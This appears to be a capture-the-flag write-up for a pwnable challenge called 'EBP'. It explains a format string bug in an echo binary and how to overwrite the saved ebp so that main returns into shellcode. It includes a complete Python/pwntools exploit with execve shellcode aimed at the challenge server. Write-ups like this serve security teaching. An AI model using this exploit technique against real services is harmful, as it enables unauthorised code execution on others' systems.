@@ -1,0 +1,162 @@
+EBP
+
+Pwnable (160 pts)
+nc 52.6.64.173 4545 
+
+Download: %p%o%o%p.
+
+We are given a binary (ebp_a96f7231ab81e1b0d7fe24d660def25a.elf) which, when run just echos back the input:
+"""
+$ ./ebp_a96f7231ab81e1b0d7fe24d660def25a.elf 
+test
+test
+
+1234
+1234
+
+[...]
+"""
+
+But when using printf format characters, we see that the binary seems to have a format string vulnerability:
+"""
+$ ./ebp_a96f7231ab81e1b0d7fe24d660def25a.elf 
+%p %p %p
+0xa 0x1 0xf773f000
+
+%n
+Segmentation fault (core dumped)
+"""
+
+Decompiling the binary results in something similar to this:
+"""
+char buf[0x400];
+char response[0x400];
+
+void make_response(void) {
+  snprintf(response, 0x400u, buf);
+}
+
+void echo(void) {
+  make_response();
+  puts(response);
+  fflush(stdout);
+}
+
+int main(int argc, const char **argv) {
+  while(fgets(buf, 1024, stdin))
+    echo();
+  return 0;
+}
+"""
+
+Indeed, the binary has a format string vulnearability (in the make_response function).
+The relevant security features of the binary:
+"""
+$ checksec --file ebp_a96f7231ab81e1b0d7fe24d660def25a.elf 
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
+Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   ebp_a96f7231ab81e1b0d7fe24d660def25a.elf
+"""
+
+Usually, format string vulnearabilities can be exploited by using the %n format
+specifier with a pointer supplied in any user controlled string on the stack,
+often the format string itself.  Unfortunately, with this binary there is no
+user controlled string on the stack.  However, the binary always saves and
+recovers the ebp to/from the stack, all functions contain these instructions at
+start/end:
+"""
+push ebp
+mov  ebp, esp
+[...]
+leave (mov esp, ebp; pop ebp)
+retn
+"""
+
+Because of this, we can control the esp between the leave and retn of the main
+function and thus control the address the retn will read its return value from.
+The snprintf is called from the make_response function, the saved ebp from that
+stack frame points to the saved ebp of the echo function.  So the format string
+vulnerability can be used to modify the saved ebp from the echo function's
+stack frame which will be used by the leave instruction at the end of the main
+function.  The final step is to write some shellcode into one of the global
+buffers and let the final retn jump to this address which can be triggered by
+closing the socket.
+
+The exploit has to be executed once for each command which should be executed.
+
+Exploit:
+"""
+#!/usr/bin/env python
+import socket
+import pwn
+
+CMD = "cat /home/problem/flag.txt"
+
+#HOST = "localhost"
+HOST = "52.6.64.173"
+PORT = 4545
+
+OFFSET = 28+60
+
+pwn.context(arch = "x86", os = "linux")
+SHELLCODE = pwn.asm(
+        pwn.shellcraft.pushstr("/bin/sh") +
+        pwn.shellcraft.mov("ebx", "esp") +
+        pwn.shellcraft.pushstr("-c") +
+        pwn.shellcraft.mov("ecx", "esp") +
+        pwn.shellcraft.pushstr(CMD) +
+        pwn.shellcraft.mov("eax", "esp") +
+        pwn.shellcraft.push(0) +
+        pwn.shellcraft.push("eax") +
+        pwn.shellcraft.push("ecx") +
+        pwn.shellcraft.push("ebx") +
+        pwn.shellcraft.mov("ecx", "esp") +
+        pwn.shellcraft.mov("eax", 11) +
+        pwn.shellcraft.syscall()
+)
+
+def ru(s, a):
+        d = ""
+
+        while not d.endswith(a):
+                c = s.recv(4096)
+                d += c
+                assert(c)
+
+        return d
+
+while True:
+        s = None
+        try:
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.connect((HOST, PORT))
+        except:
+                continue
+
+        s.sendall("%x "*100 + "\n")
+        addrs = ru(s, "\n").split(" ")
+        addrs = [int(x, 16) for x in addrs[:-1]]
+        #print [hex(x) for x in addrs]
+
+        ebp = addrs[11]
+        #print hex(ebp)
+
+        if not (ebp & 0xFFFF >= OFFSET and ebp & 0xFFFF < (0x400+OFFSET)):
+                continue
+
+        ebp -= OFFSET
+
+        s.sendall("%" + str(ebp & 0xFFFF) +"c%4$hn\n")
+        ru(s, "\n")
+
+        s.sendall("%x "*100 + "\n")
+        addrs = ru(s, "\n").split(" ")
+        addrs = [int(x, 16) for x in addrs[:-1]]
+        #print [hex(x) for x in addrs]
+
+        s.sendall(SHELLCODE + "\n")
+        ru(s, "\n")
+        raw_input()
+        s.shutdown(socket.SHUT_WR)
+        print s.recv(4096)
+        raw_input()
+"""
